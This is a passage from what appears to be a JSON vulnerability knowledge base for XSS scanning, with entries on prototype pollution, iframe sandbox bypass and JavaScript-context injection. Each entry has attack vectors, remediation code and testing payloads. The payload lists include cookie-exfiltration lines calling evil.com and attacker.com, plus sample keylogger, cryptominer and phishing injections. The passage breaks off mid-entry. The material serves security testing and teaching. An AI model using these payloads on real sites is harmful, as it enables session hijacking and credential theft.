    "remediation": "\nDEFENSE-IN-DEPTH STRATEGY:\n\n1. NEVER TRUST USER INPUT IN OBJECT CONTEXTS:\n   \n   BAD:\n   <script>\n   var config = {adminMode: <?php echo $user_input ?>};\n   </script>\n   \n   GOOD - Use JSON with validation:\n   <script>\n   var config = JSON.parse('<?php echo json_encode($config, JSON_HEX_TAG) ?>');\n   </script>\n\n2. SAFE JSON SERIALIZATION:\n   \n   Python:\n   import json\n   <script>\n   var config = {{ config_dict | tojson | safe }};\n   </script>\n   \n   PHP with flags:\n   $json = json_encode($data, \n       JSON_HEX_TAG | \n       JSON_HEX_AMP | \n       JSON_HEX_APOS | \n       JSON_HEX_QUOT | \n       JSON_THROW_ON_ERROR\n   );\n   <script>var config = <?php echo $json ?>;</script>\n   \n   Node.js:\n   const serialize = require('serialize-javascript');\n   const safeData = serialize(data, {isJSON: true});\n\n3. PROTOTYPE POLLUTION PROTECTION:\n   \n   Use Object.create(null) for maps:\n   const safeMap = Object.create(null);\n   safeMap.key = value; // No prototype chain\n   \n   Freeze Object.prototype:\n   Object.freeze(Object.prototype);\n   Object.freeze(Object);\n   \n   Validate keys before assignment:\n   function safeAssign(target, source) {\n       for (let key in source) {\n           if (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n               continue; // Skip dangerous keys\n           }\n           if (source.hasOwnProperty(key)) {\n               target[key] = source[key];\n           }\n       }\n   }\n   \n   Use Map instead of objects:\n   const config = new Map();\n   config.set(userKey, userValue); // No prototype pollution\n\n4. SECURE MERGE/EXTEND:\n   \n   Safe merge implementation:\n   function safeMerge(target, source) {\n       if (typeof source !== 'object' || source === null) {\n           return target;\n       }\n       \n       for (let key in source) {\n           // Reject dangerous keys\n           if (['__proto__', 'constructor', 'prototype'].includes(key)) {\n               continue;\n           }\n           \n           if (source.hasOwnProperty(key)) {\n               if (typeof source[key] === 'object' && source[key] !== null) {\n                   target[key] = safeMerge(target[key] || {}, source[key]);\n               } else {\n                   target[key] = source[key];\n               }\n           }\n       }\n       return target;\n   }\n   \n   Or use libraries with patches:\n   - lodash >= 4.17.21\n   - jQuery >= 3.5.0\n   - hoek >= 9.0.0\n\n5. JSON.PARSE WITH REVIVER:\n   \n   Block dangerous keys:\n   function safeReviver(key, value) {\n       const blocked = ['__proto__', 'constructor', 'prototype'];\n       if (blocked.includes(key)) {\n           return undefined; // Remove dangerous keys\n       }\n       return value;\n   }\n   \n   const obj = JSON.parse(userInput, safeReviver);\n\n6. VALIDATE OBJECT STRUCTURE:\n   \n   Use JSON Schema:\n   const Ajv = require('ajv');\n   const ajv = new Ajv();\n   \n   const schema = {\n       type: 'object',\n       properties: {\n           username: {type: 'string', pattern: '^[a-zA-Z0-9_-]+$'},\n           age: {type: 'integer', minimum: 0, maximum: 150}\n       },\n       required: ['username', 'age'],\n       additionalProperties: false // Reject unknown properties\n   };\n   \n   const validate = ajv.compile(schema);\n   if (!validate(userInput)) {\n       throw new Error('Invalid data structure');\n   }\n\n7. CONTENT SECURITY POLICY:\n   \n   Block inline scripts and eval:\n   Content-Security-Policy: \n     default-src 'self';\n     script-src 'self' 'nonce-RANDOM';\n     object-src 'none';\n   \n   Prevents execution even if object pollution succeeds\n\n8. USE TYPESCRIPT FOR TYPE SAFETY:\n   \n   interface Config {\n       readonly apiKey: string;\n       readonly timeout: number;\n   }\n   \n   function processConfig(config: Config) {\n       // TypeScript ensures only expected properties\n   }\n\n9. PREVENT PROPERTY ACCESS:\n   \n   Use hasOwnProperty:\n   if (obj.hasOwnProperty(key)) {\n       value = obj[key]; // Safe\n   }\n   \n   Or Object.hasOwn (modern):\n   if (Object.hasOwn(obj, key)) {\n       value = obj[key];\n   }\n\n10. FRAMEWORK-SPECIFIC PROTECTION:\n    \n    Update vulnerable libraries:\n    npm audit fix\n    npm update lodash jquery hoek minimist\n    \n    Use safe alternatives:\n    - Instead of _.merge: use _.mergeWith with guard\n    - Instead of $.extend: use Object.assign with validation\n    - Instead of minimist: use yargs with schema\n\nSECURITY CHECKLIST:\n\n[ ] No user input directly in object literals\n[ ] JSON serialization uses proper encoding flags\n[ ] Object.create(null) used for user-controlled maps\n[ ] Prototype pollution protection implemented\n[ ] Dangerous keys (__proto__, constructor) filtered\n[ ] Libraries updated (lodash, jQuery, etc.)\n[ ] JSON Schema validation for structure\n[ ] TypeScript for type safety (if applicable)\n[ ] hasOwnProperty checks before property access\n[ ] Map used instead of objects for user data\n[ ] CSP configured to block inline scripts\n[ ] Regular security audits (npm audit, Snyk)\n[ ] Code review for all object manipulation\n[ ] Penetration testing for prototype pollution\n\nTESTING PAYLOADS:\n\nProperty injection:\ntrue, exploit: alert(1), real: false\n\nPrototype pollution:\n{\"__proto__\": {\"polluted\": true}}\n{\"constructor\": {\"prototype\": {\"polluted\": true}}}\n\nString breakout:\n', admin: true, real: '\n\nGetter injection:\n{get value(){alert(1); return 1}}\n\nBreakout:\nnull}; alert(1); var x = {value: null\n\nComputed property:\nalert(1)\n\nTOOLS FOR DETECTION:\n- ppmap: Prototype Pollution scanner\n- npm audit: Detects vulnerable dependencies\n- Snyk: Security scanning\n- ESLint security plugins\n- SonarQube: Static analysis\n\nCVE REFERENCES:\n- CVE-2019-10744: lodash prototype pollution\n- CVE-2019-11358: jQuery prototype pollution\n- CVE-2020-7598: minimist prototype pollution\n- CVE-2018-3721: hoek prototype pollution\n- CVE-2021-23337: lodash command injection\n\nOWASP REFERENCES:\n- OWASP Prototype Pollution\n- CWE-1321: Improperly Controlled Modification of Object Prototype\n- CWE-79: Cross-site Scripting (XSS)\n"
  },
  "iframe_sandbox_xss": {
    "title": "Cross-Site Scripting (XSS) via iframe Sandbox Bypass",
    "severity": "medium",
    "cvss_score": 6.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "iframe",
      "sandbox-bypass",
      "isolation-bypass",
      "modern-web"
    ],
    "description": "\niframe Sandbox Bypass XSS occurs when iframe sandbox restrictions are bypassed or when sandbox\npolicies are insufficiently configured, allowing XSS attacks through embedded content. The iframe\nsandbox attribute provides isolation for embedded content, but misconfigurations, bypass techniques,\nand incomplete policies can lead to XSS vulnerabilities that break out of the sandbox isolation.\n\nVULNERABILITY CONTEXT:\niframe Sandbox Bypass XSS typically happens when:\n1. Sandbox policies are incompletely configured\n2. Sandbox restrictions are bypassed through various techniques\n3. User-controlled content is embedded without proper sandboxing\n4. Sandbox allowlist is too permissive\n5. Sandbox bypass techniques are used to escape isolation\n6. Nested iframe configurations create bypass opportunities\n\nCommon in:\n- Embedded content platforms\n- Widget systems\n- Third-party integrations\n- User-generated content embedding\n- Advertisement systems\n- Social media embeds\n- Document viewers\n\nSEVERITY: MEDIUM\niframe Sandbox Bypass XSS requires specific conditions and user interaction. However, successful\nbypasses can lead to full site compromise and the sandbox nature makes detection challenging.\nModern browsers have improved sandbox security, but legacy support and misconfigurations remain risks.\n",
    "attack_vector": "\nIFRAME SANDBOX BYPASS XSS ATTACK VECTORS:\n\n1. INCOMPLETE SANDBOX POLICY:\n   iframe without proper sandbox restrictions:\n   <iframe src=\"USER_CONTENT\" sandbox=\"allow-scripts\"></iframe>\n\n   Missing restrictions:\n   - allow-same-origin (allows origin access)\n   - allow-top-navigation (allows top window navigation)\n   - allow-forms (allows form submission)\n   - allow-popups (allows popup creation)\n\n2. SANDBOX ALLOWLIST BYPASS:\n   Overly permissive sandbox:\n   <iframe src=\"USER_CONTENT\" sandbox=\"allow-scripts allow-same-origin allow-forms\"></iframe>\n\n   Allows:\n   - Script execution\n   - Same-origin access\n   - Form submission\n   - Potential XSS through forms\n\n3. USER-CONTROLLED SANDBOX ATTRIBUTE:\n   Dynamic sandbox configuration:\n   <iframe src=\"content.html\" sandbox=\"USER_INPUT\"></iframe>\n\n   Attack payload:\n   allow-scripts allow-same-origin allow-top-navigation\n\n4. NESTED IFRAME BYPASS:\n   Nested iframe structure:\n   <iframe src=\"outer.html\">\n     <iframe src=\"USER_CONTENT\" sandbox=\"allow-scripts\"></iframe>\n   </iframe>\n\n   Outer iframe can manipulate inner sandbox\n\n5. SRC ATTRIBUTE INJECTION:\n   iframe src with XSS:\n   <iframe src=\"javascript:USER_INPUT\"></iframe>\n\n   Attack payload:\n   alert(document.cookie)\n\nADVANCED IFRAME SANDBOX BYPASS TECHNIQUES:\n\n6. DATA URI BYPASS:\n   Data URI in sandboxed iframe:\n   <iframe src=\"data:text/html,<script>alert(1)</script>\" sandbox=\"allow-scripts\"></iframe>\n\n   Sandbox doesn't prevent script execution in data URIs\n\n7. BLOB URI BYPASS:\n   Blob URI with malicious content:\n   const blob = new Blob(['<script>alert(1)</script>'], {type: 'text/html'});\n   const url = URL.createObjectURL(blob);\n\n   <iframe src=\"url\" sandbox=\"allow-scripts\"></iframe>\n\n8. OBJECT ELEMENT BYPASS:\n   Object element with sandbox bypass:\n   <object data=\"USER_CONTENT\" type=\"text/html\"></object>\n\n   Object elements have different sandbox behavior\n\n9. EMBED ELEMENT BYPASS:\n   Embed element injection:\n   <embed src=\"USER_CONTENT\" type=\"text/html\"></embed>\n\n   Embed elements may bypass some iframe restrictions\n\n10. FRAME ELEMENT BYPASS:\n    Legacy frame element:\n    <frame src=\"USER_CONTENT\"></frame>\n\n    Frame elements have different security model\n\n11. WINDOW.OPEN BYPASS:\n    Popup window with bypass:\n    window.open(USER_CONTENT, '_blank', 'sandbox');\n\n    Sandbox in popup may be bypassed\n\n12. POSTMESSAGE BYPASS:\n    Cross-origin communication:\n    iframe.contentWindow.postMessage(USER_INPUT, '*');\n\n    PostMessage can bypass some sandbox restrictions\n\n13. NAVIGATION TIMING BYPASS:\n    Navigation timing manipulation:\n    <iframe src=\"timing.html\" sandbox=\"allow-scripts\">\n      <script>\n        // Access timing information\n        const timing = performance.getEntriesByType('navigation')[0];\n        // Potential information disclosure\n      </script>\n    </iframe>\n\n14. RESOURCE TIMING BYPASS:\n    Resource timing access:\n    <iframe src=\"resources.html\" sandbox=\"allow-scripts\">\n      <script>\n        const resources = performance.getEntriesByType('resource');\n        // Access resource information\n      </script>\n    </iframe>\n\n15. CSP INHERITANCE BYPASS:\n    CSP inheritance in sandboxed frames:\n    <iframe src=\"csp.html\" sandbox=\"allow-scripts\">\n      <!-- May inherit or bypass CSP -->\n    </iframe>\n\nIFRAME SANDBOX-SPECIFIC BYPASSES:\n\n16. SANDBOX TOKEN ESCAPE:\n    Sandbox token manipulation:\n    <iframe sandbox=\"allow-scripts\" src=\"data:text/html,<script>top.location='javascript:alert(1)'</script>\"></iframe>\n\n17. ALLOW-TOP-NAVIGATION BYPASS:\n    Top navigation with XSS:\n    <iframe src=\"navigation.html\" sandbox=\"allow-top-navigation\">\n      <!-- Can navigate top window to XSS -->\n    </iframe>\n\n18. ALLOW-FORMS BYPASS:\n    Form submission XSS:\n    <iframe src=\"form.html\" sandbox=\"allow-forms\">\n      <form action=\"javascript:alert(1)\">\n        <input type=\"submit\">\n      </form>\n    </iframe>\n\n19. ALLOW-POPUPS BYPASS:\n    Popup creation XSS:\n    <iframe src=\"popup.html\" sandbox=\"allow-popups\">\n      <script>window.open('javascript:alert(1)')</script>\n    </iframe>\n\n20. ALLOW-SAME-ORIGIN BYPASS:\n    Same-origin access XSS:\n    <iframe src=\"/same-origin\" sandbox=\"allow-same-origin allow-scripts\">\n      <script>\n        // Can access parent window\n        top.document.body.innerHTML = '<script>alert(1)</script>';\n      </script>\n    </iframe>\n\nREAL-WORLD ATTACK SCENARIOS:\n\n21. EMBEDDED WIDGET ATTACK:\n    - Third-party widget platform\n    - Widget URL: <script>alert(1)</script>\n    - Insufficient sandbox policy\n    - Widget compromises host site\n\n22. ADVERTISEMENT SYSTEM:\n    - Ad network with embedded ads\n    - Ad content: <script>alert(1)</script>\n    - Sandbox bypass in ads\n    - Ad-based XSS attacks\n\n23. DOCUMENT VIEWER:\n    - Online document viewer\n    - Document URL: <script>alert(1)</script>\n    - Viewer iframe XSS\n    - Document-based attacks\n\n24. SOCIAL MEDIA EMBED:\n    - Social media post embed\n    - Post content: <script>alert(1)</script>\n    - Embed XSS\n    - Social engineering attacks\n\n25. FILE UPLOAD VIEWER:\n    - File upload preview\n    - Uploaded file: <script>alert(1)</script>\n    - Preview iframe XSS\n    - File upload attacks\n\n26. EXTERNAL CONTENT EMBED:\n    - External content integration\n    - Content URL: <script>alert(1)</script>\n    - Integration XSS\n    - Third-party compromise\n\n27. LEGACY BROWSER EXPLOIT:\n    - Older browser versions\n    - Sandbox implementation flaws\n    - Legacy bypass techniques\n    - Browser-specific attacks\n\nIFRAME SANDBOX BYPASS DETECTION:\n\n28. MANUAL TESTING:\n    - Browser DevTools iframe inspection\n    - Sandbox attribute verification\n    - Content Security Policy checking\n    - Cross-origin testing\n\n29. AUTOMATED SCANNING:\n    - iframe sandbox analysis\n    - Sandbox policy validation\n    - Bypass technique testing\n    - Content isolation verification\n\n30. PROXY MONITORING:\n    - iframe traffic interception\n    - Sandbox policy monitoring\n    - Content validation\n    - Isolation breach detection\n",
    "remediation": "\nIFRAME SANDBOX BYPASS XSS DEFENSE STRATEGY:\n\n1. STRICT SANDBOX POLICY (PRIMARY DEFENSE):\n   Use comprehensive sandbox restrictions:\n\n   <!-- Most restrictive sandbox -->\n   <iframe src=\"external-content.html\" sandbox></iframe>\n\n   <!-- Explicitly deny all permissions -->\n   <iframe src=\"external-content.html\" sandbox=\"\n     allow-scripts\n     allow-same-origin\n     allow-forms\n     allow-popups\n     allow-top-navigation\n     allow-pointer-lock\n     allow-orientation-lock\n   \"></iframe>\n\n2. SANDBOX POLICY VALIDATION:\n   Validate sandbox policies:\n\n   function validateSandboxPolicy(sandboxValue) {\n     if (!sandboxValue || typeof sandboxValue !== 'string') {\n       return 'allow-scripts allow-same-origin';  // Safe default\n     }\n\n     const allowedTokens = [\n       'allow-scripts',\n       'allow-same-origin',\n       'allow-forms',\n       'allow-popups',\n       'allow-top-navigation',\n       'allow-pointer-lock',\n       'allow-orientation-lock'\n     ];\n\n     const tokens = sandboxValue.split(' ').filter(token => token.trim());\n\n     // Check for invalid tokens\n     for (const token of tokens) {\n       if (!allowedTokens.includes(token)) {\n         throw new Error('Invalid sandbox token: ' + token);\n       }\n     }\n\n     // Ensure minimum security\n     if (tokens.includes('allow-scripts') && tokens.includes('allow-same-origin')) {\n       throw new Error('Dangerous sandbox combination');\n     }\n\n     return sandboxValue;\n   }\n\n3. CONTENT SOURCE VALIDATION:\n   Validate iframe sources:\n\n   function validateIframeSrc(src) {\n     if (!src) return '';\n\n     // Only allow HTTPS\n     if (!src.startsWith('https://')) {\n       throw new Error('Insecure iframe source');\n     }\n\n     // Whitelist allowed domains\n     const allowedDomains = [\n       'trusted-domain.com',\n       'cdn.trusted-domain.com',\n       'embed.trusted-domain.com'\n     ];\n\n     try {\n       const url = new URL(src);\n       if (!allowedDomains.includes(url.hostname)) {\n         throw new Error('Iframe source not allowed');\n       }\n     } catch (error) {\n       throw new Error('Invalid iframe URL');\n     }\n\n     return src;\n   }\n\n4. DYNAMIC IFRAME SECURITY:\n   Secure dynamic iframe creation:\n\n   function createSecureIframe(src, sandboxPolicy) {\n     const iframe = document.createElement('iframe');\n\n     // Validate source\n     iframe.src = validateIframeSrc(src);\n\n     // Validate and set sandbox\n     iframe.sandbox = validateSandboxPolicy(sandboxPolicy);\n\n     // Set additional security attributes\n     iframe.setAttribute('loading', 'lazy');\n     iframe.setAttribute('referrerpolicy', 'strict-origin-when-cross-origin');\n\n     return iframe;\n   }\n\n5. CSP FOR IFRAME CONTENT:\n   Content Security Policy for embedded content:\n\n   Content-Security-Policy:\n     default-src 'none';\n     script-src 'self';\n     style-src 'self';\n     img-src 'self' data: https:;\n     connect-src 'self';\n     frame-src 'self';\n     object-src 'none';\n     base-uri 'none';\n\n6. IFRAME ATTRIBUTE VALIDATION:\n   Validate all iframe attributes:\n\n   function validateIframeAttributes(iframe) {\n     const dangerousAttributes = [\n       'onload',\n       'onerror',\n       'onbeforeunload',\n       'onunload'\n     ];\n\n     for (const attr of dangerousAttributes) {\n       if (iframe.hasAttribute(attr)) {\n         throw new Error('Dangerous iframe attribute: ' + attr);\n       }\n     }\n\n     // Validate src attribute\n     const src = iframe.getAttribute('src');\n     if (src) {\n       iframe.src = validateIframeSrc(src);\n     }\n   }\n\n7. NESTED IFRAME PROTECTION:\n   Protect against nested iframe attacks:\n\n   function secureNestedIframes(parentElement) {\n     const iframes = parentElement.querySelectorAll('iframe');\n\n     iframes.forEach(iframe => {\n       // Set sandbox on all iframes\n       if (!iframe.hasAttribute('sandbox')) {\n         iframe.sandbox = 'allow-scripts allow-same-origin';\n       }\n\n       // Prevent further nesting\n       iframe.addEventListener('load', function() {\n         try {\n           const nestedIframes = iframe.contentDocument.querySelectorAll('iframe');\n           nestedIframes.forEach(nested => {\n             nested.sandbox = '';  // Most restrictive\n           });\n         } catch (error) {\n           // Cross-origin restriction - expected\n         }\n       });\n     });\n   }\n\n8. POSTMESSAGE SECURITY:\n   Secure postMessage communication:\n\n   window.addEventListener('message', function(event) {\n     // Validate origin\n     const allowedOrigins = ['https://trusted-domain.com'];\n     if (!allowedOrigins.includes(event.origin)) {\n       return;\n     }\n\n     // Validate message content\n     const cleanMessage = DOMPurify.sanitize(event.data);\n\n     // Process only validated messages\n     if (cleanMessage !== event.data) {\n       return;\n     }\n\n     processMessage(cleanMessage);\n   });\n\n9. NAVIGATION SECURITY:\n   Secure navigation in sandboxed frames:\n\n   // Prevent top navigation\n   window.addEventListener('beforeunload', function(event) {\n     if (window !== window.top) {\n       event.preventDefault();\n       event.returnValue = '';\n     }\n   });\n\n10. RESOURCE LOADING SECURITY:\n    Secure resource loading:\n\n    // Intercept resource requests\n    const originalFetch = window.fetch;\n    window.fetch = function(url, options) {\n      // Validate URL\n      if (!isValidResourceUrl(url)) {\n        throw new Error('Invalid resource URL');\n      }\n\n      return originalFetch.call(this, url, options);\n    };\n\n11. ERROR HANDLING:\n    Secure error handling:\n\n    iframe.addEventListener('error', function(event) {\n      logger.error('iframe error', {\n        src: iframe.src,\n        error: event.message\n      });\n\n      // Remove problematic iframe\n      iframe.parentNode.removeChild(iframe);\n    });\n\n12. CSP FOR SANDBOXED CONTENT:\n    Content Security Policy:\n\n    Content-Security-Policy:\n      default-src 'none';\n      script-src 'self';\n      style-src 'self' 'unsafe-inline';\n      img-src 'self' data:;\n      connect-src 'self';\n      object-src 'none';\n      frame-src 'none';  // Prevent further nesting\n\n13. ORIGIN VALIDATION:\n    Validate iframe origins:\n\n    function validateIframeOrigin(iframe) {\n      iframe.addEventListener('load', function() {\n        try {\n          const origin = iframe.contentWindow.location.origin;\n\n          if (!isAllowedOrigin(origin)) {\n            iframe.parentNode.removeChild(iframe);\n            logger.warn('Removed iframe with invalid origin', {origin: origin});\n          }\n        } catch (error) {\n          // Cross-origin - expected for sandboxed content\n        }\n      });\n    }\n\n14. LOGGING AND MONITORING:\n    Comprehensive iframe monitoring:\n\n    function logIframeEvent(event, details) {\n      logger.info('iframe event', {\n        event: event,\n        src: details.src,\n        sandbox: details.sandbox,\n        timestamp: new Date().toISOString()\n      });\n    }\n\n15. TESTING AND VALIDATION:\n    Regular security testing:\n\n    Automated tests:\n    - iframe sandbox validation\n    - Sandbox bypass testing\n    - Content isolation verification\n    - Cross-origin communication testing\n\n    Manual tests:\n    - DevTools iframe inspection\n    - Sandbox policy verification\n    - Content Security Policy testing\n\nSECURITY TESTING PAYLOADS:\n\nBasic iframe Sandbox Bypass:\n<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>\n<iframe src=\"javascript:alert(1)\"></iframe>\n<iframe src=\"vbscript:msgbox(1)\"></iframe>\n\nSandbox policy bypass:\n<iframe src=\"content.html\" sandbox=\"allow-scripts allow-same-origin\"></iframe>\n<iframe src=\"content.html\" sandbox=\"allow-forms allow-popups\"></iframe>\n\nAdvanced bypass:\n<object data=\"data:text/html,<script>alert(1)</script>\"></object>\n<embed src=\"data:text/html,<script>alert(1)</script>\"></embed>\n<frame src=\"data:text/html,<script>alert(1)</script>\"></frame>\n\nIFRAME SECURITY HEADERS:\n\nContent-Security-Policy: frame-src 'self'\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff\nReferrer-Policy: strict-origin-when-cross-origin\n\nMONITORING METRICS:\n\nMonitor for:\n- iframe creation patterns\n- Sandbox policy violations\n- Cross-origin communication\n- Nested iframe attempts\n- Resource loading anomalies\n\nOWASP REFERENCES:\n- OWASP iframe Security Cheat Sheet\n- OWASP Sandbox Bypass Techniques\n- HTML5 iframe Security\n- Content Security Policy Guide\n"
  },
  "javascript_context": {
    "title": "Cross-Site Scripting (XSS) in JavaScript Context",
    "severity": "critical",
    "cvss_score": 9.0,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "javascript",
      "code-injection",
      "critical",
      "direct-execution"
    ],
    "description": "\nUser input is placed directly into a JavaScript block, outside of a string literal. This is one of the \nmost CRITICAL XSS contexts because it allows direct code injection without needing to break out of strings \nor attributes. The attacker can inject arbitrary JavaScript statements that execute with full page privileges.\n\nVULNERABILITY CONTEXT:\nThis occurs when server-side code embeds user data directly into JavaScript:\n- <script>var user = USER_INPUT;</script>\n- <script>doSomething(USER_INPUT);</script>\n- <script>var config = {key: USER_INPUT};</script>\n- JSONP callbacks with unvalidated names\n- Dynamic script generation\n- eval() with user-controllable input\n- Function() constructor with user data\n- setTimeout/setInterval with string arguments\n- Server-side template engines embedding variables in <script> tags\n\nCommon in:\n- Server-side rendering (SSR) frameworks\n- Legacy PHP/ASP/JSP applications\n- Analytics and tracking code\n- Configuration objects\n- JSONP APIs\n- Dynamic module loaders\n\nSEVERITY: CRITICAL\nDirect JavaScript injection is the most dangerous XSS vector - no encoding bypasses needed.\nImmediate arbitrary code execution with no user interaction required.\n",
    "attack_vector": "\nDIRECT CODE INJECTION:\n\n1. BASIC INJECTION:\n   Server code:\n   <script>\n   var data = <?php echo $user_input ?>;\n   </script>\n   \n   Payload:\n   1; alert(document.cookie); var x = 1\n   \n   Result:\n   <script>\n   var data = 1; alert(document.cookie); var x = 1;\n   </script>\n\n2. VARIABLE ASSIGNMENT:\n   <script>var userId = USER_INPUT;</script>\n   \n   Payloads:\n   null; alert(1); var x=\n   123; fetch('//evil.com?c='+document.cookie); var x=\n   null}catch(e){alert(1)}try{var x=\n\n3. FUNCTION ARGUMENTS:\n   <script>doSomething(USER_INPUT);</script>\n   \n   Payloads:\n   1); alert(1); doSomething(1\n   null); fetch('//evil.com?c='+btoa(document.cookie)); doSomething(null\n   1, alert(1), 1\n\n4. OBJECT PROPERTIES:\n   <script>var config = {value: USER_INPUT};</script>\n   \n   Payloads:\n   1, exploit: alert(1), real: 1\n   null}; alert(1); var config = {value: null\n   1}};alert(1);var config = {value:1\n\nES6 TEMPLATE LITERAL EXPLOITATION:\n\n5. TEMPLATE STRINGS:\n   <script>var message = `Hello USER_INPUT`;</script>\n   \n   Payload:\n   ${alert(1)}\n   ${fetch('//evil.com?c='+document.cookie)}\n   ${constructor.constructor('alert(1)')()}\n   \n   Result:\n   <script>var message = `Hello ${alert(1)}`;</script>\n\n6. TAGGED TEMPLATES:\n   <script>sql`SELECT * FROM users WHERE id = ${USER_INPUT}`;</script>\n   \n   Payload:\n   1}; alert(1); var x = ${1\n   1} OR 1=1 --\n\n7. NESTED TEMPLATES:\n   <script>var x = `Outer ${`Inner ${USER_INPUT}`}`;</script>\n   \n   Payload:\n   ${alert(1)}\n   `+alert(1)+`\n\nPROTOTYPE POLLUTION:\n\n8. __PROTO__ INJECTION:\n   <script>var config = {USER_KEY: USER_VALUE};</script>\n   \n   If USER_KEY can be controlled:\n   __proto__: {polluted: true}\n   constructor: {prototype: {polluted: true}}\n   \n   Leading to XSS via:\n   Object.prototype.polluted = '<img src=x onerror=alert(1)>';\n\n9. CONSTRUCTOR POLLUTION:\n   <script>merge(defaultConfig, {USER_INPUT});</script>\n   \n   Payload:\n   \"constructor\": {\"prototype\": {\"isAdmin\": true}}\n\nARRAY/OBJECT CONTEXT BREAKOUTS:\n\n10. ARRAY INJECTION:\n    <script>var items = [USER_INPUT];</script>\n    \n    Payloads:\n    1]; alert(1); var items = [1\n    null]; fetch('//evil.com'); var x = [null\n    1, alert(1), 1\n\n11. NESTED OBJECTS:\n    <script>var data = {user: {name: USER_INPUT}};</script>\n    \n    Payloads:\n    null}}, exploit: alert(1), nested: {name: null\n    \"test\"}}; alert(1); var data = {user: {name: \"test\"\n\n12. BREAKING OUT WITH PUNCTUATION:\n    }, alert(1), {x:1\n    }], alert(1), [{x:1\n    })}, alert(1), {x:({\n\nFUNCTION CONSTRUCTOR ABUSE:\n\n13. eval() INJECTION:\n    <script>eval('var x = ' + USER_INPUT);</script>\n    \n    Payload:\n    1; alert(1); var y=1\n    \n    Direct execution - extremely dangerous\n\n14. Function() CONSTRUCTOR:\n    <script>var fn = new Function('return ' + USER_INPUT);</script>\n    \n    Payload:\n    1; alert(1); return 1\n    alert(1)\n\n15. setTimeout/setInterval STRINGS:\n    <script>setTimeout('doSomething(' + USER_INPUT + ')', 1000);</script>\n    \n    Payload:\n    1); alert(1); doSomething(1\n\nASYNC/AWAIT AND PROMISES:\n\n16. PROMISE CHAINS:\n    <script>\n    Promise.resolve(USER_INPUT).then(data => console.log(data));\n    </script>\n    \n    Payload:\n    null); alert(1); Promise.resolve(null\n\n17. ASYNC FUNCTIONS:\n    <script>\n    async function process() {\n        var result = USER_INPUT;\n    }\n    </script>\n    \n    Payload:\n    await fetch('//evil.com?c='+document.cookie); var result = null\n\n18. GENERATORS:\n    <script>\n    function* gen() {\n        yield USER_INPUT;\n    }\n    </script>\n    \n    Payload:\n    alert(1); yield null\n\nENCODING AND OBFUSCATION BYPASSES:\n\n19. UNICODE ESCAPES:\n    <script>var x = \\u0055SER_INPUT;</script>\n    \n    Payloads:\n    \\u0061lert(1)\n    \\u0065val(atob('YWxlcnQoMSk='))\n    \n    Bypass:\n    var x = \\u0061lert; x(1);\n\n20. HEX ESCAPES:\n    Payload:\n    \\x61lert(1)\n    \\x65\\x76\\x61\\x6c('alert(1)')\n\n21. OCTAL ESCAPES:\n    Payload:\n    \\141lert(1)\n\n22. COMMENT TRICKS:\n    Payload:\n    /**/alert(1)/**/\n    1/*comment*/;alert(1);/**/var x=1\n    1;alert(1)//rest of line ignored\n    1;alert(1)<!--HTML comment also works in JS\n    1;alert(1)-->\n\nJSONP EXPLOITATION:\n\n23. CALLBACK MANIPULATION:\n    Server: /api/data?callback=USER_INPUT\n    Response: USER_INPUT({\"data\":\"value\"})\n    \n    Payloads:\n    alert\n    alert(1);foo\n    alert(1)//\n    eval\n    Function('alert(1)')()//\n    \n    Result:\n    <script src=\"/api/data?callback=alert\"></script>\n    Executes: alert({\"data\":\"value\"})\n\n24. JSONP WITH VALIDATION BYPASS:\n    If server validates [a-zA-Z0-9_]:\n    \n    Use existing functions:\n    alert\n    console.log\n    eval\n    \n    With dots (if allowed):\n    console.log\n    document.write\n    window.alert\n\nFRAMEWORK-SPECIFIC ATTACKS:\n\n25. ANGULAR (v1.x) TEMPLATE INJECTION IN SCRIPT:\n    <script>\n    var template = '{{USER_INPUT}}';\n    </script>\n    \n    Payload:\n    {{constructor.constructor('alert(1)')()}}\n    {{$on.constructor('alert(1)')()}}\n\n26. VUE SERVER-SIDE RENDERING:\n    <script>\n    var app = new Vue({\n        data: {value: 'USER_INPUT'}\n    });\n    </script>\n    \n    If USER_INPUT reaches template:\n    {{constructor.constructor('alert(1)')()}}\n\n27. REACT SSR ESCAPING BYPASS:\n    Normally React escapes, but in <script>:\n    <script>\n    window.__INITIAL_STATE__ = USER_INPUT;\n    </script>\n    \n    If not properly serialized:\n    </script><script>alert(1)</script><script>\n\nADVANCED EXPLOITATION TECHNIQUES:\n\n28. SCRIPT GADGETS:\n    Using existing page scripts for exploitation:\n    \n    If page has:\n    <script>\n    function loadModule(name) {\n        var script = document.createElement('script');\n        script.src = '/modules/' + name + '.js';\n        document.body.appendChild(script);\n    }\n    </script>\n    \n    Inject:\n    null; loadModule('../../evil.com/xss'); var x=null\n\n29. BREAKING OUT OF FUNCTIONS:\n    <script>\n    function process() {\n        var data = USER_INPUT;\n        return data;\n    }\n    </script>\n    \n    Payloads:\n    null; } alert(1); function process() { var data=null\n    null}};alert(1);process=function(){return null\n\n30. MODULE IMPORTS:\n    <script type=\"module\">\n    import {func} from 'USER_INPUT';\n    </script>\n    \n    Payload:\n    data:text/javascript,alert(1)//\n\nREAL-WORLD ATTACK SCENARIOS:\n\nSESSION HIJACKING:\n<script>\nvar userId = null; \nfetch('//attacker.com/steal?c=' + btoa(document.cookie));\nvar x = null;\n</script>\n\nKEYLOGGER:\n<script>\nvar data = null;\ndocument.addEventListener('keypress', e => {\n    fetch('//attacker.com/log?k=' + e.key);\n});\nvar x = null;\n</script>\n\nCRYPTOCURRENCY MINING:\n<script>\nvar config = null;\nvar script = document.createElement('script');\nscript.src = '//attacker.com/coinhive.min.js';\ndocument.head.appendChild(script);\nsetTimeout(() => {\n    new CoinHive.Anonymous('attacker-key').start();\n}, 1000);\nvar x = null;\n</script>\n\nPHISHING PAGE INJECTION:\n<script>\nvar user = null;\ndocument.body.innerHTML = '<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999\"><form action=\"//evil.com/phish\" method=\"POST\"><h2>Session 